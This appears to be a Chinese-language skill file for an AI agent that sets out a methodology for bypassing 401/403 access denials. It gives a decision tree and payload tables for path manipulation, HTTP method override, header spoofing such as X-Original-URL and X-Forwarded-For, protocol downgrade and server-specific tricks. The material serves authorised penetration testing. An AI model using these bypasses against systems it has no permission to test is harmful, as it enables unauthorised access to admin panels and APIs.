---
name: 401-403-bypass
description: "401/403 访问拒绝绕过方法论。当遇到管理后台、API 端点返回 401/403 Forbidden 时使用。覆盖路径操纵、HTTP 方法篡改、Header 注入、协议降级、组合攻击"
metadata:
  tags: "403,401,bypass,forbidden,绕过,路径操纵,method override,X-Original-URL,X-Forwarded-For,access control,权限绕过"
  category: "exploit"
---

# 401/403 绕过方法论

核心思路：反向代理/WAF 检查一种路径格式，但后端做了不同的路径规范化。

## 深入参考

- 路径操纵 Payload 完整列表 → [references/path-manipulation-payloads.md](references/path-manipulation-payloads.md)
- HTTP 方法/Header 绕过 → [references/method-header-bypass.md](references/method-header-bypass.md)
- 中间件特定绕过与组合攻击 → [references/middleware-combo-bypass.md](references/middleware-combo-bypass.md)

---

## 决策树

```
遇到 401/403？
├── 1. 路径操纵（成功率最高）
│   ├── /path/ → /PATH → /path%20 → /./path → //path
│   ├── /path;x → /path..;/ → /%2e/path → /path%00
│   └── 200？→ 绕过成功
├── 2. 方法绕过
│   ├── POST/PUT/PATCH/DELETE/OPTIONS/HEAD
│   ├── X-HTTP-Method-Override: PUT
│   └── PROPFIND/自定义方法
├── 3. Header 绕过
│   ├── X-Original-URL: /path（Nginx/IIS）
│   ├── X-Forwarded-For: 127.0.0.1（IP 白名单）
│   └── Referer/Origin/Host 伪造
├── 4. 协议绕过
│   └── HTTP/1.0
├── 5. 组合攻击
│   └── Method + Path + Header 三合一
├── 全部失败 → 其他思路
│   ├── 请求走私 → cache-poisoning-smuggling
│   ├── SSRF → ssrf-methodology
│   ├── IDOR → idor-methodology
│   └── 认证逻辑 → privilege-escalation-web
└── 自动化扫描 byp4xx / 403bypasser
```

---

## 快速参考 — 路径操纵要点

| 技巧 | 示例 |
|------|------|
| 尾部斜杠/点 | `/admin/`  `/admin/.` |
| 大小写 | `/Admin`  `/ADMIN` |
| URL 编码 | `/%61dmin`  `/admi%6e` |
| 双重编码 | `/%2561dmin` |
| Unicode 过长编码 | `/admi%C0%AE` |
| 点段/路径穿越 | `/./admin`  `//admin` |
| NULL 字节 | `/admin%00`  `/admin%00.json` |
| 路径参数 (Tomcat) | `/admin;foo`  `/;/admin` |
| 反斜杠 (IIS) | `/admin\` |

## 快速参考 — 方法/Header 要点

| 技巧 | 示例 |
|------|------|
| 方法切换 | `POST /admin`  `PUT /admin` |
| Method Override | `X-HTTP-Method-Override: PUT` |
| URL 重写 | `X-Original-URL: /admin` |
| IP 伪造 | `X-Forwarded-For: 127.0.0.1` |
| 协议降级 | `GET /admin HTTP/1.0` |

## 中间件速查

| 服务器 | 关键技巧 |
|---|---|
| **Apache** | `/admin/`(尾部斜杠), `/.admin`(点前缀) |
| **Nginx** | `/Admin`(大小写), `X-Original-URL` |
| **IIS/ASP.NET** | `/admin;.css`, `/admin\`, `/admin::$DATA` |
| **Tomcat/Java** | `/admin;foo`, `/admin..;/`, `/;/admin` |
| **Spring** | `/admin.anything`(旧版后缀匹配) |

> 完整 payload 列表见 references 文件
